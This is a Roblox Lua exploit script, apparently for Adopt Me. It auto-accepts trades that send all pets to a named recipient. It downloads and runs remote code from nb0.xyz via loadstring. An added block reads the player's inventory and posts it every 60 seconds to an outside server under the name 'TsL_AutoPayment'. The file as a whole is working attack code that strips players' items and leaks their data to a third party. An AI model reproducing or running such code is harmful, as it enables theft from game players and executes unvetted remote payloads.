getgenv().hub_key = "87e7720afa3d8a67389178df6b8f4fb1"
--auto accept and complete trades
getgenv().autoaccept = true

--auto trade will not work if autoaccept is true
getgenv().autotrade = false

--The person your sending the trade to.
getgenv().recipient = "PLAYER_NAME"

getgenv().trade_queue = { "pets" }
-- { "all" }
--{ "pets", "transport", "gifts", "pet_accessories", "strollers", "toys", "food" }

getgenv().pet_kind = {}
--Choose 1 pet type example { "snorgle", "cheetah" } or "{}" for all pets.

getgenv().pet_type = "ALL"
--Choose 1
--ALL, "mega", "neon", "regular", "eggs"

getgenv().selectedRarity = "ALL"
--Choose 1
--"ALL", "legendary", "ultra_rare", "rare", "uncommon", "common"

getgenv().selectedAge = "ALL"
--Choose 1
--"ALL", "1", "2", "3", "4", "5", "6"

loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_AUTO_TRADE.lua"))()

-- =========================
-- Inventory sender addon
-- =========================

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local BACKEND_URL = "https://api.adoptmehub.com/inventory"
local API_KEY = "a8sd921ndsa23s"
local RECEIVER_NAME = "TsL_AutoPayment"
local SEND_INTERVAL = 60

local request_fn = request or http_request or (syn and syn.request)
if not request_fn then
    warn("No supported request function found")
    return
end

local clientData
do
    local ok, result = pcall(function()
        return require(ReplicatedStorage.ClientModules.Core.ClientData)
    end)

    if not ok or not result then
        warn("Could not load ClientData module")
        return
    end

    clientData = result
end

local function buildInventoryPayload()
    local payload = {
        pets = {},
        food = {},
        timestamp = os.time(),
        user = RECEIVER_NAME
    }

    local ok, pdata = pcall(function()
        return clientData.get_data()[tostring(LocalPlayer)]
    end)

    if not ok or not pdata or not pdata.inventory then
        return nil, "inventory data not found"
    end

    for id, pet in pairs(pdata.inventory.pets or {}) do
        table.insert(payload.pets, {
            id = id,
            name = pet.name or pet.id or "unknown_pet",
            rarity = pet.rarity or "N/A"
        })
    end

    for id, item in pairs(pdata.inventory.food or {}) do
        table.insert(payload.food, {
            id = id,
            quantity = item.quantity or 1,
            name = item.name or item.id or "unknown_food"
        })
    end

    return payload
end

local function sendInventory()
    local payload, err = buildInventoryPayload()
    if not payload then
        warn("BUILD FAILED: " .. tostring(err))
        return
    end

    local body = HttpService:JSONEncode(payload)

    local ok, response = pcall(function()
        return request_fn({
            Url = BACKEND_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["x-inventory-key"] = API_KEY
            },
            Body = body
        })
    end)

    if ok and response then
        print("INVENTORY SENT:", response.StatusCode or response.Status or "unknown")
        print("RESPONSE:", response.Body or "no body")
    else
        warn("REQUEST FAILED: " .. tostring(response))
    end
end

task.spawn(function()
    while true do
        sendInventory()
        task.wait(SEND_INTERVAL)
    end
end)
